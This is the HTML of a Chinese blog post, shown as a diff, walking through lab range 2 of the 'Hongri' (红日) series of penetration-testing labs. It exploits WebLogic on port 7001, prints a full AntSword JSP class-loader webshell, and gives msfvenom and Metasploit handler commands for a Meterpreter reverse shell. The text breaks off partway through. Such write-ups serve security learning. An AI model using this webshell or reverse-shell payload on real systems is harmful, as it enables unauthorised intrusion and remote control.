@@ -1,0 +1,599 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>红日靶场2 - ThnPinkman’s blog</title><meta name="Description" content="只是向上走"><meta property="og:url" content="https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/">
+  <meta property="og:site_name" content="ThnPinkman’s blog">
+  <meta property="og:title" content="红日靶场2">
+  <meta property="og:description" content="红日靶场2 拓扑图 默认密码：1qaz@WSX
+0x01环境搭建 我是参考此视频
+https://www.bilibili.com/video/BV1De4y1a7Ps/?spm_id_from=333.337.search-card.all.click&amp;vd_source=cf73ac8de9b7c0322b1bccf77de91c5dnat模式分配111段
+自定义一个10.10.10.x 的网络 我命名为VMnet5
+进入WEB中，来到C:\Oracle\Middleware\user_projects\domains\base_domain\bin 路径 以管理员权限执行startWebLogic
+0x02信息收集 端口扫描 这个命令显示更详细，可以看到不少的服务都打开了
+漏洞探测 80端口是空白，这边先重点关注一下7001 Oracle WebLogic Server
+跳转到404
+尝试使用WeblogicScan脚本探测漏洞：
+python3 WeblogicScan.py -u 192.168.111.80 -p 7001 有合适的cve
+github准备好exp工具进行利用
+-u 检测 -f上传木马
+得到一个url 可以直接执行命令
+上帝视角去看靶机的shell.jsp的文件位置
+C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\wls-wsat\54p17w\war
+传入马比较棘手且比赛也没有上帝视角，另寻其他方法
+getShell 找到个工具weblogic漏洞检测工具
+输入url就能扫漏洞，然后命令执行，最好用的是可以文件上传，这里传入一个蚁剑的jsp马
+&lt;%!class U extends ClassLoader {U(ClassLoader c) {super(c);}public Class g(byte[] b) {return super.defineClass(b, 0, b.length);}}public byte[] base64Decode(String str) throws Exception {try {Class clazz = Class.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-20T23:52:36+08:00">
+    <meta property="article:modified_time" content="2024-08-20T23:52:36+08:00">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="红日靶场2">
+  <meta name="twitter:description" content="红日靶场2 拓扑图 默认密码：1qaz@WSX
+0x01环境搭建 我是参考此视频
+https://www.bilibili.com/video/BV1De4y1a7Ps/?spm_id_from=333.337.search-card.all.click&amp;vd_source=cf73ac8de9b7c0322b1bccf77de91c5dnat模式分配111段
+自定义一个10.10.10.x 的网络 我命名为VMnet5
+进入WEB中，来到C:\Oracle\Middleware\user_projects\domains\base_domain\bin 路径 以管理员权限执行startWebLogic
+0x02信息收集 端口扫描 这个命令显示更详细，可以看到不少的服务都打开了
+漏洞探测 80端口是空白，这边先重点关注一下7001 Oracle WebLogic Server
+跳转到404
+尝试使用WeblogicScan脚本探测漏洞：
+python3 WeblogicScan.py -u 192.168.111.80 -p 7001 有合适的cve
+github准备好exp工具进行利用
+-u 检测 -f上传木马
+得到一个url 可以直接执行命令
+上帝视角去看靶机的shell.jsp的文件位置
+C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\wls-wsat\54p17w\war
+传入马比较棘手且比赛也没有上帝视角，另寻其他方法
+getShell 找到个工具weblogic漏洞检测工具
+输入url就能扫漏洞，然后命令执行，最好用的是可以文件上传，这里传入一个蚁剑的jsp马
+&lt;%!class U extends ClassLoader {U(ClassLoader c) {super(c);}public Class g(byte[] b) {return super.defineClass(b, 0, b.length);}}public byte[] base64Decode(String str) throws Exception {try {Class clazz = Class.">
+<meta name="application-name" content="ThnPinkman&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="ThnPinkman&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/" /><link rel="prev" href="https://thnpkm.github.io/posts/ctf/0xgame2022/" /><link rel="next" href="https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "红日靶场2",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/thnpkm.github.io\/posts\/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F\/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2\/"
+        },"genre": "posts","keywords": "","wordcount":  223 ,
+        "url": "https:\/\/thnpkm.github.io\/posts\/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F\/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2\/","datePublished": "2024-08-20T23:52:36+08:00","dateModified": "2024-08-20T23:52:36+08:00","publisher": {
+            "@type": "Organization",
+            "name": "","logo": "https:\/\/thnpkm.github.io\/1651835469576.jpg"},"author": {
+                "@type": "Person",
+                "name": "Author"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="ThnPinkman’s blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.github.io/1651835469576.jpg"
+        data-srcset="https://thnpkm.github.io/1651835469576.jpg, https://thnpkm.github.io/1651835469576.jpg 1.5x, https://thnpkm.github.io/1651835469576.jpg 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.github.io/1651835469576.jpg"
+        title="https://thnpkm.github.io/1651835469576.jpg" />ThnPinkman&#39;s blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="ThnPinkman’s blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.github.io/1651835469576.jpg"
+        data-srcset="https://thnpkm.github.io/1651835469576.jpg, https://thnpkm.github.io/1651835469576.jpg 1.5x, https://thnpkm.github.io/1651835469576.jpg 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.github.io/1651835469576.jpg"
+        title="https://thnpkm.github.io/1651835469576.jpg" />ThnPinkman&#39;s blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">红日靶场2</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-category">included in <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>内网渗透</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-08-20">2024-08-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;223 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;2 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#拓扑图">拓扑图</a></li>
+    <li><a href="#0x01环境搭建">0x01环境搭建</a></li>
+    <li><a href="#0x02信息收集">0x02信息收集</a>
+      <ul>
+        <li><a href="#端口扫描">端口扫描</a></li>
+        <li><a href="#漏洞探测">漏洞探测</a></li>
+        <li><a href="#getshell">getShell</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x03内网渗透">0x03内网渗透：</a>
+      <ul>
+        <li><a href="#msf上线">msf上线</a></li>
+        <li><a href="#msf派生cs">msf派生cs</a></li>
+        <li><a href="#横向移动">横向移动</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="红日靶场2">红日靶场2</h1>
+<h2 id="拓扑图">拓扑图</h2>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920173259464.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920173259464.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920173259464.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920173259464.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220920173259464.png"
+        title="image-20220920173259464" /></p>
+<p>默认密码：<code>1qaz@WSX</code></p>
+<h2 id="0x01环境搭建">0x01环境搭建</h2>
+<p>我是参考此视频</p>
+<p><a href="https://www.bilibili.com/video/BV1De4y1a7Ps/?spm_id_from=333.337.search-card.all.click&amp;vd_source=cf73ac8de9b7c0322b1bccf77de91c5d" target="_blank" rel="noopener noreffer">https://www.bilibili.com/video/BV1De4y1a7Ps/?spm_id_from=333.337.search-card.all.click&vd_source=cf73ac8de9b7c0322b1bccf77de91c5d</a>
+</p>
+<p>nat模式分配111段</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920195620657.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920195620657.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920195620657.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920195620657.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220920195620657.png"
+        title="image-20220920195620657" /></p>
+<p>自定义一个10.10.10.x 的网络 我命名为VMnet5</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920195749828.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920195749828.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920195749828.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920195749828.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220920195749828.png"
+        title="image-20220920195749828" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920195855560.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920195855560.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920195855560.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920195855560.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220920195855560.png"
+        title="image-20220920195855560" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920200515880.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920200515880.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920200515880.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920200515880.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220920200515880.png"
+        title="image-20220920200515880" /></p>
+<p>进入WEB中，来到C:\Oracle\Middleware\user_projects\domains\base_domain\bin 路径
+以管理员权限执行startWebLogic</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220921195032675.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220921195032675.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220921195032675.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220921195032675.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220921195032675.png"
+        title="image-20220921195032675" /></p>
+<h2 id="0x02信息收集">0x02信息收集</h2>
+<h3 id="端口扫描">端口扫描</h3>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920203018419.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920203018419.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920203018419.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920203018419.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220920203018419.png"
+        title="image-20220920203018419" /></p>
+<p>这个命令显示更详细，可以看到不少的服务都打开了</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920203227312.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920203227312.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920203227312.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920203227312.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220920203227312.png"
+        title="image-20220920203227312" /></p>
+<h3 id="漏洞探测">漏洞探测</h3>
+<p>80端口是空白，这边先重点关注一下7001 Oracle WebLogic Server</p>
+<p>跳转到404</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920203610862.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920203610862.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920203610862.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920203610862.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220920203610862.png"
+        title="image-20220920203610862" /></p>
+<p>尝试使用WeblogicScan脚本探测漏洞：</p>
+<pre tabindex="0"><code>python3 WeblogicScan.py -u 192.168.111.80 -p 7001
+</code></pre><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920205211041.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920205211041.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920205211041.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920205211041.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220920205211041.png"
+        title="image-20220920205211041" /></p>
+<p>有合适的cve</p>
+<p>github准备好exp工具进行利用</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920205036640.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920205036640.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920205036640.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920205036640.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220920205036640.png"
+        title="image-20220920205036640" /></p>
+<p>-u 检测  -f上传木马</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920205423372.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920205423372.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920205423372.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920205423372.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220920205423372.png"
+        title="image-20220920205423372" /></p>
+<p>得到一个url 可以直接执行命令</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920205538708.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920205538708.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920205538708.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920205538708.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220920205538708.png"
+        title="image-20220920205538708" /></p>
+<p>上帝视角去看靶机的shell.jsp的文件位置</p>
+<p><code>C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\wls-wsat\54p17w\war</code></p>
+<p>传入马比较棘手且比赛也没有上帝视角，另寻其他方法</p>
+<h3 id="getshell">getShell</h3>
+<p>找到个工具<code>weblogic漏洞检测工具</code></p>
+<p>输入url就能扫漏洞，然后命令执行，最好用的是可以文件上传，这里传入一个蚁剑的jsp马</p>
+<pre tabindex="0"><code class="language-jsp" data-lang="jsp">&lt;%!
+    class U extends ClassLoader {
+        U(ClassLoader c) {
+            super(c);
+        }
+        public Class g(byte[] b) {
+            return super.defineClass(b, 0, b.length);
+        }
+    }
+    public byte[] base64Decode(String str) throws Exception {
+        try {
+            Class clazz = Class.forName(&#34;sun.misc.BASE64Decoder&#34;);
+            return (byte[]) clazz.getMethod(&#34;decodeBuffer&#34;, String.class).invoke(clazz.newInstance(), str);
+        } catch (Exception e) {
+            Class clazz = Class.forName(&#34;java.util.Base64&#34;);
+            Object decoder = clazz.getMethod(&#34;getDecoder&#34;).invoke(null);
+            return (byte[]) decoder.getClass().getMethod(&#34;decode&#34;, String.class).invoke(decoder, str);
+        }
+    }
+%&gt;
+&lt;%
+    String cls = request.getParameter(&#34;passwd&#34;);
+    if (cls != null) {
+        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
+    }
+%&gt;
+</code></pre><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920235451085.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920235451085.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920235451085.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220920235451085.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220920235451085.png"
+        title="image-20220920235451085" /></p>
+<p>成功返回一个路径，成功getshell</p>
+<!-- raw HTML omitted -->
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220921195156727.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220921195156727.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220921195156727.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220921195156727.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220921195156727.png"
+        title="image-20220921195156727" /></p>
+<p>可以命令执行</p>
+<p>直接用msf来打cve来</p>
+<h2 id="0x03内网渗透">0x03内网渗透：</h2>
+<h3 id="msf上线">msf上线</h3>
+<pre tabindex="0"><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.111.128 LPORT=4444 -f exe -o aaa.exe
+生成木马
+</code></pre><p>这里命令没有/x64，有x64的话我这上线不了</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220921212018433.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220921212018433.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220921212018433.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220921212018433.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220921212018433.png"
+        title="image-20220921212018433" /></p>
+<p>将木马上传到蚁剑</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220921212049573.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220921212049573.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220921212049573.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220921212049573.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220921212049573.png"
+        title="image-20220921212049573" /></p>
+<p>msf这里开启监听</p>
+<pre tabindex="0"><code>use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.111.128
+set LPORT 4444
+run
+</code></pre><p>蚁剑运行上传的木马</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220921212135890.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220921212135890.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220921212135890.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220921212135890.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220921212135890.png"
+        title="image-20220921212135890" /></p>
+<p>我要哭了，终于上线了</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220921211734410.png"
